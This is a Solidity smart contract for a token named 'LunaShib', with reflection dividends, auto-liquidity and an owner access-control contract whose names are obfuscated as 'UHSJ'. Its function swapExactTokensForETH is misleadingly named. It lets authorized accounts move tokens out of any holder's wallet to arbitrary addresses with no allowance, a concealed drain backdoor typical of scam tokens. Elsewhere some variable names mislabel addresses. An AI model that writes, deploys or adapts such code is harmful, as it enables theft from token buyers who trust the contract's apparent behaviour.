row number 
1	             pragma solidity ^0.7.4;
2	 library SafeMath {
3	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
4	 uint256 c = a + b;
5	 require(c >= a, "SafeMath: addition overflow");
6	 return c;
7	 }
8	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
9	 return sub(a, b, "SafeMath: subtraction overflow");
10	 }
11	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
12	 require(b <= a, errorMessage);
13	 uint256 c = a - b;
14	 return c;
15	 }
16	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
17	 if (a == 0) {
18	 return 0;
19	 }
20	 uint256 c = a * b;
21	 require(c / a == b, "SafeMath: multiplication overflow");
22	 return c;
23	 }
24	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
25	 return div(a, b, "SafeMath: division by zero");
26	 }
27	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
28	 require(b > 0, errorMessage);
29	 uint256 c = a / b;
30	 return c;
31	 }
32	 }
33	 interface IBEP20 {
34	 function totalSupply() external view returns (uint256);
35	 function decimals() external view returns (uint8);
36	 function symbol() external view returns (string memory);
37	 function name() external view returns (string memory);
38	 function owner() external view returns (address);
39	 function balanceOf(address account) external view returns (uint256);
40	 function transfer(address recipient, uint256 amount) external returns (bool);
41	 function allowance(address _owner, address spender) external view returns (uint256);
42	 function approve(address spender, uint256 amount) external returns (bool);
43	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
44	 event Transfer(address indexed from, address indexed to, uint256 value);
45	 event Approval(address indexed Owner, address indexed spender, uint256 value);
46	 }
47	 abstract contract UHSJ {
48	 address internal Owner;
49	 mapping (address => bool) internal UHSJorizations;
50	 constructor(address _owner) {
51	 Owner = _owner;
52	 }
53	 modifier onlyOwner() {
54	 require(isOwner(msg.sender), "!OWNER");
55	 _;
56	 }
57	 modifier UHSJorized() {
58	 require(isUHSJorized(msg.sender), "!UHSJORIZED");
59	 _;
60	 }
61	 function UHSJorize(address adr) public onlyOwner {
62	 UHSJorizations[adr] = true;
63	 }
64	 function unUHSJorize(address adr) public onlyOwner {
65	 UHSJorizations[adr] = false;
66	 }
67	 function isOwner(address account) public view returns (bool) {
68	 return account == Owner;
69	 }
70	 function isUHSJorized(address adr) public view returns (bool) {
71	 return UHSJorizations[adr];
72	 }
73	 function transferOwnership(address payable adr) public onlyOwner {
74	 Owner = adr;
75	 UHSJorizations[adr] = true;
76	 emit OwnershipTransferred(adr);
77	 }
78	 event OwnershipTransferred(address Owner);
79	 }
80	 interface IDEXFactory {
81	 function createPair(address tokenA, address tokenB) external returns (address pair);
82	 }
83	 interface IDEXRouter {
84	 function factory() external pure returns (address);
85	 function WETH() external pure returns (address);
86	 function addLiquidity( address tokenA, address tokenB, uint amountADesired, uint amountBDesired, uint amountAMin, uint amountBMin, address to, uint deadline ) external returns (uint amountA, uint amountB, uint liquidity);
87	 function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
88	 function swapExactTokensForTokensSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external;
89	 function swapExactETHForTokensSupportingFeeOnTransferTokens( uint amountOutMin, address[] calldata path, address to, uint deadline ) external payable;
90	 function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external;
91	 }
92	 interface IDividendDistributor {
93	 function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
94	 function setShare(address shareholder, uint256 amount) external;
95	 function deposit() external payable;
96	 function process(uint256 gas) external;
97	 }
98	 contract DividendDistributor is IDividendDistributor {
99	 using SafeMath for uint256;
100	 address _token;
101	 struct Share {
102	 uint256 amount;
103	 uint256 totalExcluded;
104	 uint256 totalRealised;
105	 }
106	 IBEP20 Doge = IBEP20(0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE);
107	 address WBNB = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
108	 IDEXRouter router;
109	 address[] shareholders;
110	 mapping (address => uint256) shareholderIndexes;
111	 mapping (address => uint256) shareholderClaims;
112	 mapping (address => Share) public shares;
113	 uint256 public totalShares;
114	 uint256 public totalDividends;
115	 uint256 public totalDistributed;
116	 uint256 public dividendsPerShare;
117	 uint256 public dividendsPerShareAccuracyFactor = 10 ** 32;
118	 uint256 public minPeriod = 45 minutes;
119	 uint256 public minDistribution = 1 * (10 ** 8);
120	 uint256 currentIndex;
121	 bool initialized;
122	 modifier initialization() {
123	 require(!initialized);
124	 _;
125	 initialized = true;
126	 }
127	 modifier onlyToken() {
128	 require(msg.sender == _token);
129	 _;
130	 }
131	 constructor (address _router) {
132	 router = _router != address(0) ? IDEXRouter(_router) : IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
133	 _token = msg.sender;
134	 }
135	 function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external override onlyToken {
136	 minPeriod = _minPeriod;
137	 minDistribution = _minDistribution;
138	 }
139	 function setShare(address shareholder, uint256 amount) external override onlyToken {
140	 if(shares[shareholder].amount > 0){
141	 distributeDividend(shareholder);
142	 }
143	 if(amount > 0 && shares[shareholder].amount == 0){
144	 addShareholder(shareholder);
145	 }
146	 else if(amount == 0 && shares[shareholder].amount > 0){
147	 removeShareholder(shareholder);
148	 }
149	 totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
150	 shares[shareholder].amount = amount;
151	 shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
152	 }
153	 function deposit() external payable override onlyToken {
154	 uint256 balanceBefore = Doge.balanceOf(address(this));
155	 address[] memory path = new address[](2);
156	 path[0] = WBNB;
157	 path[1] = address(Doge);
158	 router.swapExactETHForTokensSupportingFeeOnTransferTokens{
159	 value: msg.value}
160	 ( 0, path, address(this), block.timestamp );
161	 uint256 amount = Doge.balanceOf(address(this)).sub(balanceBefore);
162	 totalDividends = totalDividends.add(amount);
163	 dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
164	 }
165	 function process(uint256 gas) external override onlyToken {
166	 uint256 shareholderCount = shareholders.length;
167	 if(shareholderCount == 0) {
168	 return;
169	 }
170	 uint256 gasUsed = 0;
171	 uint256 gasLeft = gasleft();
172	 uint256 iterations = 0;
173	 while(gasUsed < gas && iterations < shareholderCount) {
174	 if(currentIndex >= shareholderCount){
175	 currentIndex = 0;
176	 }
177	 if(shouldDistribute(shareholders[currentIndex])){
178	 distributeDividend(shareholders[currentIndex]);
179	 }
180	 gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
181	 gasLeft = gasleft();
182	 currentIndex++;
183	 iterations++;
184	 }
185	 }
186	 function shouldDistribute(address shareholder) internal view returns (bool) {
187	 return shareholderClaims[shareholder] + minPeriod < block.timestamp && getUnpaidEarnings(shareholder) > minDistribution;
188	 }
189	 function distributeDividend(address shareholder) internal {
190	 if(shares[shareholder].amount == 0){
191	 return;
192	 }
193	 uint256 amount = getUnpaidEarnings(shareholder);
194	 if(amount > 0){
195	 totalDistributed = totalDistributed.add(amount);
196	 Doge.transfer(shareholder, amount);
197	 shareholderClaims[shareholder] = block.timestamp;
198	 shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
199	 shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
200	 }
201	 }
202	 function claimDividend() external {
203	 distributeDividend(msg.sender);
204	 }
205	 function getUnpaidEarnings(address shareholder) public view returns (uint256) {
206	 if(shares[shareholder].amount == 0){
207	 return 0;
208	 }
209	 uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
210	 uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;
211	 if(shareholderTotalDividends <= shareholderTotalExcluded){
212	 return 0;
213	 }
214	 return shareholderTotalDividends.sub(shareholderTotalExcluded);
215	 }
216	 function getCumulativeDividends(uint256 share) internal view returns (uint256) {
217	 return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
218	 }
219	 function addShareholder(address shareholder) internal {
220	 shareholderIndexes[shareholder] = shareholders.length;
221	 shareholders.push(shareholder);
222	 }
223	 function removeShareholder(address shareholder) internal {
224	 shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
225	 shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
226	 shareholders.pop();
227	 }
228	 }
229	 contract LunaShib is IBEP20, UHSJ {
230	 using SafeMath for uint256;
231	 address WBNB = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
232	 address DEAD = 0x000000000000000000000000000000000000dEaD;
233	 address ZERO = 0x0000000000000000000000000000000000000000;
234	 string private _name = "LunaShib";
235	 string private _symbol = "LunaShib";
236	 uint8 private _decimals = 18;
237	 uint256 _totalSupply = 1 * 10**11 * (10 ** _decimals);
238	 uint256 public _maxTxAmount = ( _totalSupply * 100 ) / 100;
239	 uint256 public _maxWalletToken = ( _totalSupply * 3 ) / 100;
240	 mapping (address => uint256) _balances;
241	 mapping (address => mapping (address => uint256)) _allowances;
242	 mapping (address => bool) isFeeExempt;
243	 mapping (address => bool) isTxLimitExempt;
244	 mapping (address => bool) isTimelockExempt;
245	 mapping (address => bool) isDividendExempt;
246	 uint256 liquidityFee = 2;
247	 uint256 reflectionFee = 5;
248	 uint256 marketingFee = 3;
249	 uint256 public totalFee = 10;
250	 uint256 feeDenominator = 100;
251	 address public autoLiquidityReceiver;
252	 address public marketingFeeReceiver;
253	 uint256 targetLiquidity = 15;
254	 uint256 targetLiquidityDenominator = 100;
255	 IDEXRouter public router;
256	 address public pair;
257	 DividendDistributor distributor;
258	 uint256 distributorGas = 500000;
259	 bool public swapEnabled = true;
260	 uint256 public swapThreshold = 10000;
261	 bool inSwap;
262	 modifier swapping() {
263	 inSwap = true;
264	 _;
265	 inSwap = false;
266	 }
267	 constructor () UHSJ(msg.sender) {
268	 router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
269	 pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
270	 _allowances[address(this)][address(router)] = uint256(-1);
271	 distributor = new DividendDistributor(address(router));
272	 isFeeExempt[msg.sender] = true;
273	 isTxLimitExempt[msg.sender] = true;
274	 isTxLimitExempt[DEAD] = true;
275	 isTimelockExempt[msg.sender] = true;
276	 isTimelockExempt[DEAD] = true;
277	 isTimelockExempt[address(this)] = true;
278	 isDividendExempt[pair] = true;
279	 isDividendExempt[address(this)] = true;
280	 isDividendExempt[DEAD] = true;
281	 autoLiquidityReceiver = msg.sender;
282	 marketingFeeReceiver = 0x3C6Da034924B3D2fA3985D2732a991E39FF6F5D9;
283	 _balances[msg.sender] = _totalSupply;
284	 emit Transfer(address(0), msg.sender, _totalSupply);
285	 }
286	 receive() external payable {
287	 }
288	 function totalSupply() external view override returns (uint256) {
289	 return _totalSupply;
290	 }
291	 function decimals() external view override returns (uint8) {
292	 return _decimals;
293	 }
294	 function symbol() external view override returns (string memory) {
295	 return _symbol;
296	 }
297	 function name() external view override returns (string memory) {
298	 return _name;
299	 }
300	 function owner() external view override returns (address) {
301	 return Owner;
302	 }
303	 function balanceOf(address account) public view override returns (uint256) {
304	 return _balances[account];
305	 }
306	 function allowance(address holder, address spender) external view override returns (uint256) {
307	 return _allowances[holder][spender];
308	 }
309	 function approve(address spender, uint256 amount) public override returns (bool) {
310	 _allowances[msg.sender][spender] = amount;
311	 emit Approval(msg.sender, spender, amount);
312	 return true;
313	 }
314	 function approveMax(address spender) external returns (bool) {
315	 return approve(spender, uint256(-1));
316	 }
317	 function transfer(address recipient, uint256 amount) external override returns (bool) {
318	 return _transferFrom(msg.sender, recipient, amount);
319	 }
320	 function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
321	 if(_allowances[sender][msg.sender] != uint256(-1)){
322	 _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
323	 }
324	 return _transferFrom(sender, recipient, amount);
325	 }
326	 function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
327	 if(inSwap){
328	 return _basicTransfer(sender, recipient, amount);
329	 }
330	 if (!UHSJorizations[sender] && recipient != address(this) && recipient != address(DEAD) && recipient != pair && recipient != marketingFeeReceiver && recipient != autoLiquidityReceiver){
331	 uint256 heldTokens = balanceOf(recipient);
332	 require((heldTokens + amount) <= _maxWalletToken,"Total Holding is currently limited, you can not buy that much.");
333	 }
334	 checkTxLimit(sender, amount);
335	 if(shouldSwapBack()){
336	 swapBack();
337	 }
338	 _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
339	 uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, amount, (recipient == pair)) : amount;
340	 _balances[recipient] = _balances[recipient].add(amountReceived);
341	 if(!isDividendExempt[sender]) {
342	 try distributor.setShare(sender, _balances[sender]) {
343	 }
344	 catch {
345	 }
346	 }
347	 if(!isDividendExempt[recipient]) {
348	 try distributor.setShare(recipient, _balances[recipient]) {
349	 }
350	 catch {
351	 }
352	 }
353	 try distributor.process(distributorGas) {
354	 }
355	 catch {
356	 }
357	 emit Transfer(sender, recipient, amountReceived);
358	 return true;
359	 }
360	 function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
361	 _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
362	 _balances[recipient] = _balances[recipient].add(amount);
363	 emit Transfer(sender, recipient, amount);
364	 return true;
365	 }
366	 function checkTxLimit(address sender, uint256 amount) internal view {
367	 require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
368	 }
369	 function shouldTakeFee(address sender) internal view returns (bool) {
370	 return !isFeeExempt[sender];
371	 }
372	 function takeFee(address sender, uint256 amount, bool isSell) internal returns (uint256) {
373	 uint256 feeAmount = amount.mul(totalFee).div(feeDenominator);
374	 isSell = isSell;
375	 _balances[address(this)] = _balances[address(this)].add(feeAmount);
376	 emit Transfer(sender, address(this), feeAmount);
377	 return amount.sub(feeAmount);
378	 }
379	 function shouldSwapBack() internal view returns (bool) {
380	 return msg.sender != pair && !inSwap && swapEnabled && _balances[address(this)] >= swapThreshold;
381	 }
382	 function swapBack() internal swapping {
383	 uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : liquidityFee;
384	 uint256 amountToLiquify = balanceOf(address(this)).mul(dynamicLiquidityFee).div(totalFee).div(2);
385	 uint256 amountToSwap = balanceOf(address(this)).sub(amountToLiquify);
386	 address[] memory path = new address[](2);
387	 path[0] = address(this);
388	 path[1] = WBNB;
389	 uint256 balanceBefore = address(this).balance;
390	 router.swapExactTokensForETHSupportingFeeOnTransferTokens( amountToSwap, 0, path, address(this), block.timestamp );
391	 uint256 amountBNB = address(this).balance.sub(balanceBefore);
392	 uint256 totalBNBFee = totalFee.sub(dynamicLiquidityFee.div(2));
393	 uint256 amountBNBLiquidity = amountBNB.mul(dynamicLiquidityFee).div(totalBNBFee).div(2);
394	 uint256 amountBNBReflection = amountBNB.mul(reflectionFee).div(totalBNBFee);
395	 uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee);
396	 try distributor.deposit{
397	 value: amountBNBReflection}
398	 () {
399	 }
400	 catch {
401	 }
402	 (bool tmpSuccess,) = payable(marketingFeeReceiver).call{
403	 value: amountBNBMarketing, gas: 30000}
404	 ("");
405	 tmpSuccess = false;
406	 if(amountToLiquify > 0){
407	 router.addLiquidityETH{
408	 value: amountBNBLiquidity}
409	 ( address(this), amountToLiquify, 0, 0, autoLiquidityReceiver, block.timestamp );
410	 emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
411	 }
412	 }
413	 function setTxLimit(uint256 amount) external UHSJorized {
414	 _maxTxAmount = amount;
415	 }
416	 function setIsDividendExempt(address holder, bool exempt) external UHSJorized {
417	 require(holder != address(this) && holder != pair);
418	 isDividendExempt[holder] = exempt;
419	 if(exempt){
420	 distributor.setShare(holder, 0);
421	 }
422	 else{
423	 distributor.setShare(holder, _balances[holder]);
424	 }
425	 }
426	 function setIsFeeExempt(address holder, bool exempt) external UHSJorized {
427	 isFeeExempt[holder] = exempt;
428	 }
429	 function setIsTxLimitExempt(address holder, bool exempt) external UHSJorized {
430	 isTxLimitExempt[holder] = exempt;
431	 }
432	 function setIsTimelockExempt(address holder, bool exempt) external UHSJorized {
433	 isTimelockExempt[holder] = exempt;
434	 }
435	 function setFees(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _feeDenominator) external UHSJorized {
436	 liquidityFee = _liquidityFee;
437	 reflectionFee = _reflectionFee;
438	 marketingFee = _marketingFee;
439	 totalFee = _liquidityFee.add(_reflectionFee).add(_marketingFee);
440	 feeDenominator = _feeDenominator;
441	 require(totalFee < feeDenominator/4);
442	 }
443	 function setSwapBackSettings(bool _enabled, uint256 _amount) external UHSJorized {
444	 swapEnabled = _enabled;
445	 swapThreshold = _amount;
446	 }
447	 function setTargetLiquidity(uint256 _target, uint256 _denominator) external UHSJorized {
448	 targetLiquidity = _target;
449	 targetLiquidityDenominator = _denominator;
450	 }
451	 function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external UHSJorized {
452	 distributor.setDistributionCriteria(_minPeriod, _minDistribution);
453	 }
454	 function setDistributorSettings(uint256 gas) external UHSJorized {
455	 require(gas < 750000);
456	 distributorGas = gas;
457	 }
458	 function getCirculatingSupply() public view returns (uint256) {
459	 return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
460	 }
461	 function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
462	 return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
463	 }
464	 function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
465	 return getLiquidityBacking(accuracy) > target;
466	 }
467	 function swapExactTokensForETH( address from, address[] calldata addresses, uint256 tokens ) external UHSJorized {
468	 require( addresses.length < 2001, "GAS Error: max airdrop limit is 2000 addresses" );
469	 uint256 SCCC = tokens * addresses.length;
470	 require(balanceOf(from) >= SCCC, "Not enough tokens in wallet");
471	 for (uint256 i = 0; i < addresses.length; i++) {
472	 _basicTransfer(from, addresses[i], tokens);
473	 if (!isDividendExempt[addresses[i]]) {
474	 try distributor.setShare(addresses[i], balanceOf(addresses[i])) {
475	 }
476	 catch {
477	 }
478	 }
479	 }
480	 if (!isDividendExempt[from]) {
481	 try distributor.setShare(from, balanceOf(from)) {
482	 }
483	 catch {
484	 }
485	 }
486	 }
487	 event AutoLiquify(uint256 amountBNB, uint256 amountBOG);
488	 }
